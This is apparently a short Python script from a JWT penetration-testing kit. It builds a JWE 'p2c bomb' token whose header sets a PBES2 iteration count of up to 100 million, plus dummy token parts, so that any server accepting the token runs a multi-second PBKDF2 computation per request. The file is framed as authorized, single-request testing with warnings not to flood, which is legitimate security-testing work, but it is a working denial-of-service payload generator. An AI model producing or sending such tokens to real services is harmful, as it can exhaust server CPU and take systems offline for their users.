#!/usr/bin/env python3
"""
jwe_dos_token.py — build a JWE "p2c bomb" header to test PBES2 resource-exhaustion DoS
(JWT_TESTING_GUIDE.md §20.1).  *** ONLY where DoS is explicitly IN SCOPE. ***

PBES2 key-wrap JWE derives the wrapping key with PBKDF2 using an ATTACKER-CONTROLLED iteration
count ("p2c" in the header). A token with p2c = 100,000,000 forces the verifier to run that many
PBKDF2 rounds PER verification -> multi-second CPU hang per request. This script only constructs the
JWE *protected header* + a minimal token shape so you can demonstrate the per-request cost; it does NOT
flood. Show the ratio (tiny token -> huge work) on ONE request, then stop. CWE-400.

Do NOT sustain this against production. Authorized testing only.

Usage:
  python3 jwe_dos_token.py --p2c 100000000
  python3 jwe_dos_token.py --p2c 50000000 --alg PBES2-HS512+A256KW --enc A256GCM
"""
import argparse, base64, json, os

def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--p2c", type=int, default=100_000_000, help="PBKDF2 iteration count (the 'bomb')")
    ap.add_argument("--alg", default="PBES2-HS256+A128KW")
    ap.add_argument("--enc", default="A128GCM")
    a = ap.parse_args()

    # p2s = PBKDF2 salt input (random); the cost is driven by p2c, which the SERVER honors blindly.
    p2s = b64u(os.urandom(16))
    header = {"alg": a.alg, "enc": a.enc, "p2c": a.p2c, "p2s": p2s}
    protected = b64u(json.dumps(header, separators=(",", ":")).encode())

    # A JWE is 5 parts: header.encrypted_key.iv.ciphertext.tag. For a *cost* probe, the server typically
    # derives the PBKDF2 key (the expensive step) BEFORE it fails on the (dummy) ciphertext — so the
    # placeholder parts below are enough to trigger the work on many libraries. (Some libs validate
    # structure first; if so, wrap a real-but-tiny JWE with this header.)
    dummy = b64u(b"x")
    token = ".".join([protected, dummy, dummy, dummy, dummy])

    print("# JWE protected header (decoded):")
    print(json.dumps(header, indent=2))
    print("\n# token (header carries the p2c bomb):")
    print(token)
    print(f"\n[!] This forces ~{a.p2c:,} PBKDF2 rounds PER verification on a PBES2-accepting server.")
    print("[!] Send ONE request, MEASURE the response time vs a normal token (show the multi-second delta),")
    print("    report the single-request cost + ratio. DoS must be IN SCOPE. Do NOT flood. (CWE-400, §20.1)")

if __name__ == "__main__":
    main()
